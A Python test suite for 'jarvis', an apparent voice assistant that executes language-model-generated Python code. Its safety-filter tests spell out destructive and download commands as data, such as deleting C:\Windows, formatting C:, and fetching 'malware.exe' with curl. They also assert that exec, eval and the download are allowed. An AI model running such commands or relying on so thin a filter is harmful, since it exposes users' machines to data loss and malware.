"""
Test suite for jarvis.py (no audio/microphone/API required).
Run: python test_jarvis_functions.py
"""
import os
import sys
import threading
import time


os.startfile = lambda url: print(f"[MOCK] os.startfile({url})")

class _MockPyAutoGUI:
    def size(self): return 1920, 1080
    def click(self, x, y): print(f"[MOCK] pyautogui.click({x}, {y})")
    def press(self, key): print(f"[MOCK] pyautogui.press('{key}')")

sys.modules['pyautogui'] = _MockPyAutoGUI()

class _MockMixerMusic:
    @staticmethod
    def get_busy(): return False
    @staticmethod
    def load(f): pass
    @staticmethod
    def play(): pass
    @staticmethod
    def stop(): pass
    @staticmethod
    def unload(): pass

class _MockMixer:
    music = _MockMixerMusic()
    @staticmethod
    def init(): pass
    @staticmethod
    def quit(): pass
    @staticmethod
    def get_init(): return True

class _MockPygameClock:
    def tick(self, fps): pass

class _MockPygameTime:
    Clock = _MockPygameClock

class _MockPygame:
    mixer = _MockMixer()
    time = _MockPygameTime()

sys.modules['pygame'] = _MockPygame()

class _MockSR:
    class Recognizer: pass
    class Microphone:
        def __enter__(self): return self
        def __exit__(self, *a): pass
    class UnknownValueError(Exception): pass
    class RequestError(Exception): pass

sys.modules['speech_recognition'] = _MockSR()

import asyncio

class _FakeCommunicate:
    def __init__(self, text, voice): pass
    async def save(self, path): pass

class _MockEdgeTTS:
    Communicate = _FakeCommunicate

sys.modules['edge_tts'] = _MockEdgeTTS()

import types
openai_mod = types.ModuleType('openai')
class _MockOpenAI:
    def __init__(self, **kwargs): pass
openai_mod.OpenAI = _MockOpenAI
sys.modules['openai'] = openai_mod

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
try:
    import jarvis
    from jarvis import (
        strip_wake_word,
        contains_wake_word,
        is_code_safe,
        detect_intent_from_text,
        parse_and_execute_tags,
        play_yandex_music,
        execute_system_command,
    )
except ImportError as e:
    print(f"Import error: {e}")
    import traceback; traceback.print_exc()
    sys.exit(1)

_pass = 0
_fail = 0

def check(desc, condition):
    global _pass, _fail
    if condition:
        _pass += 1
        status = "PASS"
    else:
        _fail += 1
        status = "FAIL"
    print(f"  [{status}] {desc}")
    return condition

def test_wake_word():
    print("\n=== Wake-Word Detection ===")
    check("Detects 'dzharvs' (ru)", contains_wake_word("джарвис открой браузер"))
    check("Detects 'Jarvis' (en case)", contains_wake_word("Jarvis, открой браузер"))
    check("Detects mixed case JARVIS", contains_wake_word("JARVIS стоп"))
    check("No false positive on normal text", not contains_wake_word("открой браузер пожалуйста"))
    check("No false positive single word", not contains_wake_word("привет"))


def test_strip_wake_word():
    print("\n=== Wake-Word Stripping ===")
    r = strip_wake_word("джарвис открой браузер")
    check(f"Prefix stripped: '{r}'", r == "открой браузер")

    r = strip_wake_word("открой браузер джарвис")
    check(f"Suffix stripped: '{r}'", r == "открой браузер")

    r = strip_wake_word("jarvis включи волну")
    check(f"English prefix: '{r}'", r == "включи волну")

    r = strip_wake_word("джарвис")
    check(f"Wake-word only -> empty: '{r}'", r == "")

    r = strip_wake_word("  джарвис,  включи музыку  ")
    check(f"With punctuation/spaces: '{r}'", "включи музыку" in r)

    r = strip_wake_word("Jarvis, открой блокнот, пожалуйста")
    check(f"EN with comma: '{r}'", "открой блокнот" in r)


def test_safety():
    print("\n=== Safety Filter ===")

    safe, _ = is_code_safe("import subprocess\nsubprocess.Popen('calc.exe')")
    check("SAFE: open calc via Popen", safe)

    safe, _ = is_code_safe("import pyautogui\npyautogui.press('space')")
    check("SAFE: pyautogui automation", safe)

    safe2, r2 = is_code_safe("import shutil\nshutil.rmtree('/some/path')")
    check("ANTI-WIPE allow: rmtree of an ordinary folder", safe2)

    safe3, r3 = is_code_safe("exec('import os')")
    check("ANTI-WIPE allow: exec()", safe3)

    safe4, r4 = is_code_safe("eval('1+1')")
    check("ANTI-WIPE allow: eval()", safe4)

    safe5, r5 = is_code_safe("")
    check(f"ANTI-WIPE block: empty code -> {r5}", not safe5)

    safe6, r6 = is_code_safe("import os\nos.remove('somefile.txt')")
    check("ANTI-WIPE allow: single-file os.remove", safe6)

    b1, _ = is_code_safe(r'import shutil; shutil.rmtree(r"C:\Windows")')
    check("ANTI-WIPE block: rmtree C:\\Windows", not b1)

    b2, _ = is_code_safe('subprocess.run("format C: /q")')
    check("ANTI-WIPE block: format C:", not b2)

    b3, _ = is_code_safe(r'shutil.rmtree(r"C:\Users\user\Documents\JARVIS")')
    check("ANTI-WIPE block: wipe the JARVIS repo", not b3)

    b4, _ = is_code_safe('subprocess.call("curl -o malware.exe https://x/y.exe")')
    check("ANTI-WIPE allow: download exe (no content filter)", b4)


def test_intent_fallback():
    print("\n=== Intent Fallback Detection ===")

    tag = detect_intent_from_text("открой браузер")
    check(f"Browser: '{tag}'", tag == "[OPEN:browser]")

    tag = detect_intent_from_text("запусти хром")
    check(f"Chrome: '{tag}'", tag == "[OPEN:browser]")

    tag = detect_intent_from_text("открой блокнот")
    check(f"Notepad: '{tag}'", tag == "[OPEN:notepad]")

    tag = detect_intent_from_text("запусти калькулятор")
    check(f"Calc: '{tag}'", tag == "[OPEN:calc]")

    tag = detect_intent_from_text("включи мою волну")
    check(f"Music wave: '{tag}'", tag is not None and "MUSIC" in tag)

    tag = detect_intent_from_text("включи музыку")
    check(f"Music open: '{tag}'", tag is not None and "MUSIC" in tag)

    tag = detect_intent_from_text("который час")
    check(f"No intent for question: '{tag}'", tag is None)

    tag = detect_intent_from_text("как дела")
    check(f"No intent for chat: '{tag}'", tag is None)


def test_tag_parsing():
    print("\n=== Tag Parsing & Execution ===")

    actions_taken = []

    original_exec = jarvis.execute_system_command
    original_play = jarvis.play_yandex_music

    def mock_exec(cmd):
        actions_taken.append(f"OPEN:{cmd}")
        return True
    def mock_play(q, auto_play):
        actions_taken.append(f"MUSIC:{q or 'OPEN'}")
        return "Открываю музыку, сэр."

    jarvis.execute_system_command = mock_exec
    jarvis.play_yandex_music = mock_play

    try:
        actions_taken.clear()
        result = parse_and_execute_tags("[OPEN:browser]", "открой браузер")
        check("[OPEN:browser] executed", any("browser" in a for a in actions_taken))
        check("[OPEN:browser] removed from reply", "[OPEN:browser]" not in result)

        actions_taken.clear()
        result = parse_and_execute_tags("[OPEN:notepad]", "открой блокнот")
        check("[OPEN:notepad] executed", any("notepad" in a for a in actions_taken))

        actions_taken.clear()
        result = parse_and_execute_tags("[OPEN:calc]", "открой калькулятор")
        check("[OPEN:calc] executed", any("calc" in a for a in actions_taken))

        actions_taken.clear()
        result = parse_and_execute_tags("[MUSIC:PLAY:Prodigy]", "включи Prodigy")
        check("[MUSIC:PLAY:] executed", any("Prodigy" in a for a in actions_taken))
        check("[MUSIC:PLAY:] removed from reply", "[MUSIC:PLAY:" not in result)

        actions_taken.clear()
        result = parse_and_execute_tags("[MUSIC:OPEN]", "открой яндекс музыку")
        check("[MUSIC:OPEN] executed", len(actions_taken) > 0)
        check("[MUSIC:OPEN] removed from reply", "[MUSIC:OPEN]" not in result)

        actions_taken.clear()
        result = parse_and_execute_tags("Конечно, сэр.", "открой браузер")
        check("Intent fallback triggers on no-tag reply", any("browser" in a for a in actions_taken))
        check("Intent fallback reports actual opening", result == "Открываю, сэр.")

        actions_taken.clear()
        result = parse_and_execute_tags(
            "Какую именно музыку включить, сэр?",
            "включи музыку"
        )
        check("REGRESSION: music fallback fires on question reply", len(actions_taken) > 0)
        check("REGRESSION: questioning reply is overridden", "Какую именно" not in result)

        actions_taken.clear()
        result = parse_and_execute_tags("[OPEN:calc]", "открой браузер")
        check("Tag takes priority over fallback (calc executed)", any("calc" in a for a in actions_taken))

        actions_taken.clear()
        result = parse_and_execute_tags("", "")
        check("Empty reply does not claim an action succeeded", result == "Не получил ответа, сэр.")

        actions_taken.clear()
        ran = []
        _orig_exec_py = jarvis.execute_python_code
        def mock_exec_py(code, force=False):
            ran.append(code)
            return "ok"
        jarvis.execute_python_code = mock_exec_py
        import threading as _threading
        _orig_thread = _threading.Thread
        class _ImmediateThread:
            def __init__(self, target=None, args=(), daemon=None):
                self._target = target
                self._args = args
            def start(self):
                self._target(*self._args)
        _threading.Thread = _ImmediateThread
        try:
            result = parse_and_execute_tags(
                "[EXECUTE_PYTHON]\nprint('hello')\n[/EXECUTE_PYTHON]",
                "выполни python"
            )
            check("EXECUTE_PYTHON dispatched safe code", len(ran) > 0)
            check("EXECUTE_PYTHON block removed from reply", "[EXECUTE_PYTHON]" not in result)
        finally:
            _threading.Thread = _orig_thread
            jarvis.execute_python_code = _orig_exec_py

    finally:
        jarvis.execute_system_command = original_exec
        jarvis.play_yandex_music = original_play


def test_edge_tts_event_loop():
    """Make sure _run_edge_tts_sync doesn't crash with event loop issues."""
    print("\n=== edge-tts Event Loop (Windows-safe) ===")
    result = jarvis._run_edge_tts_sync("Привет сэр.", "test_tts_output.wav")
    check("_run_edge_tts_sync returns True", result is True)
    if os.path.exists("test_tts_output.wav"):
        try: os.remove("test_tts_output.wav")
        except: pass


if __name__ == "__main__":
    print("=" * 50)
    print("  JARVIS TEST SUITE (no audio/mic/API needed)")
    print("=" * 50)

    test_wake_word()
    test_strip_wake_word()
    test_safety()
    test_intent_fallback()
    test_tag_parsing()
    test_edge_tts_event_loop()

    print("\n" + "=" * 50)
    print(f"  Results: {_pass} passed, {_fail} failed")
    print("=" * 50)
    if _fail > 0:
        sys.exit(1)
